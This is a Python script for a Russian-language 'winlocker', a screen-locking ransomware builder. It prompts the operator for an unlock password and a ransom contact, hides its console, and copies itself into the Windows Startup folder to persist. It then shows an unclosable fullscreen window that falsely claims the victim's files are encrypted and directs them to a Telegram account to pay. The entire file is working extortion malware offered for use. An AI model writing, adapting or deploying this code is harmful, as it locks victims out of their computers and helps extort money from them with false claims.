print(r"""
    .o88o.                               o8o                .
    888 `"                               `"'              .o8
   o888oo   .oooo.o  .ooooo.   .ooooo.  oooo   .ooooo.  .o888oo oooo    ooo
    888    d88(  "8 d88' `88b d88' `"Y8 `888  d88' `88b   888    `88.  .8'
    888    `"Y88b.  888   888 888        888  888ooo888   888     `88..8'
    888    o.  )88b 888   888 888   .o8  888  888    .o   888 .    `888'
   o888o   8""888P' `Y8bod8P' `Y8bod8P' o888o `Y8bod8P'   "888"      d8'
        """)
print(r"""





""")
parol = input("введите пароль от винлокера: ")
name = input("введите от кого будет винлокер: ")
otkup = input("введите куда написать для откупа: ")

import tkinter as tk
import os
from tkinter import messagebox
import shutil
import sys
import ctypes
import time

def add_to_startup_folder():
    script_path = os.path.abspath(sys.argv[0])
    
    startup_folder = os.path.join(
        os.environ["APPDATA"],
        "Microsoft", "Windows", "Start Menu", "Programs", "Startup"
    )
    
    try:
        shutil.copy2(script_path, startup_folder)
    except Exception as e:
        print(f"!✗ Ошибка: {e}")

print("00x(2)00003 system error")
print("00x1003")
time.sleep(0.2)
print("000x300002")
print("000x0004200 Ecryptor activated!")

time.sleep(0.5)

ctypes.windll.user32.ShowWindow(ctypes.windll.kernel32.GetConsoleWindow(), 0)

def check_input(event=None):
    user_input = entry.get().strip()  
    if user_input == f"{parol}":  
        messagebox.showinfo("Доступ разблокирован!", "Вы разблокировали доступ к системе! Нажмите ОК для закрытия блокировщика.\nПользуйтесь : )")
        root.destroy() 
    else:
         messagebox.showinfo("упс!", "неверный пароль!")

root = tk.Tk()
root.title("black hat winlocker")


root.attributes("-fullscreen", True)
root.configure(bg="blue")

root.attributes("-topmost", True)

root.protocol("WM_DELETE_WINDOW", lambda: None)

label = tk.Label(root, text="ваш виндовс заблокирован k9gy", foreground="white", background="blue", font=("Arial", 35))
label.pack(pady=20)


entry = tk.Entry(root, width=30, font=("Arial", 25))
entry.pack(pady=10)


entry.bind("<Return>", check_input)


button = tk.Button(root, text="подтвердить", command=check_input)
button.pack(pady=5)

label = tk.Label(
    root,
    text="вас заметили",
    foreground="white",        
    background="blue",  
    font=("Arial", 70),
    padx=10,
    pady=10
)
label.pack()


label = tk.Label(
    root,
    text="👁",
    foreground="white",        
    background="blue",  
    font=("Arial", 70),
    padx=10,
    pady=10
)
label.pack()

label = tk.Label(
    root,
    text=r"""
    упс! вы подверглись хакерской атаке и ваши файлы были зашифрованы!
    пока ваш компьютер находится в этом состоянии вы ничего не сможете сделать.
    Любая попытка обхода вируса карается повторным запуском вируса!""",
    foreground="white",        
    background="blue",  
    font=("Arial", 30),
    padx=10,
    pady=10
)
label.pack()

label = tk.Label(
    root,
    text=r"""
    для откупа вы можете связатся с нами
    писать нужно в социальную сеть telegram
    юзернейм автора @Halitava""",
    foreground="white",        
    background="blue",  
    font=("Arial", 30),
    padx=10,
    pady=10
)

label.pack()
if __name__ == "__main__":
    add_to_startup_folder()
    root.mainloop()